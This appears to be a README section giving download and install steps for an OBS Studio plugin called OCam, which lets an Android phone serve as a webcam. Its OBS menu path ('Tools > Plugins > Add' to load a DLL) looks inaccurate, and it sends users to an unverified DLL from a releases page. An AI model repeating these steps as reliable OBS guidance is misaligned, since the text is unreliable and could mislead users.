## ðŸ“¥ Download & Install
1. **Visit the Releases Page**  
   Go to [OCam Releases](https://github.com/aravindhthehustler/OCam/releases) to access the latest version.

2. **Choose Your Version**  
   Find the most recent version listed on the Releases page. Each version will have a set of files you can download.

3. **Download the Plugin**  
   Look for the file named `OCam-Plugin.zip` or similar. Click on the link to download it to your computer.

4. **Extract the Files**  
   After downloading, locate the zip file in your computer's Downloads folder. Right-click on the file and select "Extract All" or use your preferred extraction tool.

5. **Locate the OCam Plugin**  
   Once extracted, open the folder. You should see a file named `OCam.dll`. This is the plugin file you need for OBS.

6. **Install the Plugin in OBS**  
   Open your OBS Studio application.  
   - Go to `Tools` in the top menu.
   - Select `Plugins` from the dropdown.
   - Click `Add`, then browse to the location where you extracted the plugin.
   - Choose `OCam.dll` and add it.

7. **Configure OCam**  
   - In OBS, add a new source by clicking the `+` button in the Sources panel.
   - Select `Video Capture Device`.
   - In the next window, choose `OCam` from the list of available devices.

8. **Start Streaming**  
   Adjust your settings as needed and click `Start Streaming.` You are now ready to use your Android device as a webcam.
